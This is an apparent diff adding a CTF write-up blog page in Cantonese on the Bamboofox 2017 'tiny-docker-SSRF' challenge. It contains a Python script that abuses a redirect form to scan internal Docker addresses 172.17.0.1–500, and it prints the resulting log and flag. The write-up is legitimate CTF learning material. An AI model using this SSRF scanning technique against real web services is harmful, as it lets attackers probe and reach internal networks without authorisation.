@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>BamboofoxCTF2017-tiny-docker-SSRF | CatPawn</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Questionhttp://bamboofox.cs.nctu.edu.tw:53323/ SolutionHint112345There is a lot of server/docker in a company.So you may need a little brute-force.You will get the flag between 1 to 500 Hint21Mostly,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BamboofoxCTF2017-tiny-docker-SSRF">
+<meta property="og:url" content="catpawn.github.io/2018/01/01/tiny-docker-SSRF/index.html">
+<meta property="og:site_name" content="CatPawn">
+<meta property="og:description" content="Questionhttp://bamboofox.cs.nctu.edu.tw:53323/ SolutionHint112345There is a lot of server/docker in a company.So you may need a little brute-force.You will get the flag between 1 to 500 Hint21Mostly,">
+<meta property="og:updated_time" content="2018-01-01T10:10:00.683Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BamboofoxCTF2017-tiny-docker-SSRF">
+<meta name="twitter:description" content="Questionhttp://bamboofox.cs.nctu.edu.tw:53323/ SolutionHint112345There is a lot of server/docker in a company.So you may need a little brute-force.You will get the flag between 1 to 500 Hint21Mostly,">
+  
+    <link rel="alternate" href="/atom.xml" title="CatPawn" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">CatPawn</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="catpawn.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-tiny-docker-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/01/tiny-docker-SSRF/" class="article-date">
+  <time datetime="2018-01-01T10:01:02.000Z" itemprop="datePublished">2018-01-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      BamboofoxCTF2017-tiny-docker-SSRF
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="http://bamboofox.cs.nctu.edu.tw:53323/" target="_blank" rel="noopener">http://bamboofox.cs.nctu.edu.tw:53323/</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Hint1"><a href="#Hint1" class="headerlink" title="Hint1"></a>Hint1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There is a lot of server/docker in a company.</span><br><span class="line"></span><br><span class="line">So you may need a little brute-force.</span><br><span class="line"></span><br><span class="line">You will get the flag between 1 to 500</span><br></pre></td></tr></table></figure>
+<h3 id="Hint2"><a href="#Hint2" class="headerlink" title="Hint2"></a>Hint2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mostly, container share a bridge...</span><br></pre></td></tr></table></figure>
+<p>呢2個hint想表達既似乎係有另一部裝住flag 既docker server係同題目係同一個subnet.<br>而係需要少少brute force既 , 咁應該係ip啦<br>如果係internal network既 , 咁應該係由172.17開頭<br>即刻寫條script brute brute佢先</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = requests.post(<span class="string">"http://bamboofox.cs.nctu.edu.tw:53323/redirect.php"</span>,data=&#123;<span class="string">'url'</span>:<span class="string">'172.17.0.'</span> + str(i)&#125;,timeout=<span class="number">0.5</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Warning"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"[+] !!!! "</span> + <span class="string">'172.17.0.'</span> + str(i)</span><br><span class="line">			output += <span class="string">"==============172.17.0."</span> + str(i) + <span class="string">"====================="</span></span><br><span class="line">			output += r.text</span><br><span class="line">			output += <span class="string">"============================================================\r\n"</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"[-] Fail : "</span> + <span class="string">'172.17.0.'</span> + str(i)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"[-]"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"C:/Users/admin/Desktop/out.log"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(output.encode(<span class="string">'ascii'</span>, <span class="string">'ignore'</span>).decode(<span class="string">'ascii'</span>))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
+<p>最後係 172.17.0.80 搵到條flag</p>
+<h3 id="out-log"><a href="#out-log" class="headerlink" title="out.log"></a>out.log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">==============172.17.0.79=====================&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Docker-SSRF&lt;/title&gt;</span><br><span class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;center&quot;&gt;</span><br><span class="line">            &lt;form action=&quot;./redirect.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                &lt;h2&gt;</span><br><span class="line">                    Redirect to: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;</span><br><span class="line">                    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">                &lt;/h2&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;img src=&quot;https://res.cloudinary.com/blog-mornati-net/image/upload/v1472668207/sz9sfwiji9foh0cv1v5p.png&quot; style=&quot;width: 60%;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">============================================================</span><br><span class="line">==============172.17.0.80=====================&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Flag&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.bk &#123;</span><br><span class="line">    background-color: aliceblue;</span><br><span class="line">&#125;</span><br><span class="line">.block &#123;</span><br><span class="line">    margin: auto;</span><br><span class="line">    width: 50%;</span><br><span class="line">    padding: 20px;</span><br><span class="line">    text-align: center;</span><br><span class="line">    margin-top: 10%;</span><br><span class="line">    border: solid 2px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body class=&quot;bk&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;block&quot;&gt;</span><br><span class="line">            &lt;h2&gt;BAMBOOFOX&#123;5srF1n0ocK3r&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;h3&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection&quot;&gt;Server-Side Request Forgery!!&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">            &lt;img src=&quot;https://d3eaqdewfg2crq.cloudfront.net/wp-content/uploads/2013/08/image2-1024x425.png&quot; style=&quot;width: 100%;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>BAMBOOFOX{5srF1n0ocK3r}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="catpawn.github.io/2018/01/01/tiny-docker-SSRF/" data-id="cjbw1blrx0006xww5gpwj6xbn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/01/01/Bamboofox2017-suck-file/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Bamboofox2017-suck-file
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/01/Bamboofox2017-tiny-git/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Bamboofox2017-tiny-git</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/01/01/Bamboofox2017-suck-file/">Bamboofox2017-suck-file</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/01/tiny-docker-SSRF/">BamboofoxCTF2017-tiny-docker-SSRF</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/01/Bamboofox2017-tiny-git/">Bamboofox2017-tiny-git</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/01/Bamboofox2017-net-packet/">Bamboofox2017-net-packet</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/01/Bamboofox2017-little-asm-revenge/">Bamboofox2017-little-asm-revenge</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 CatPawn<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
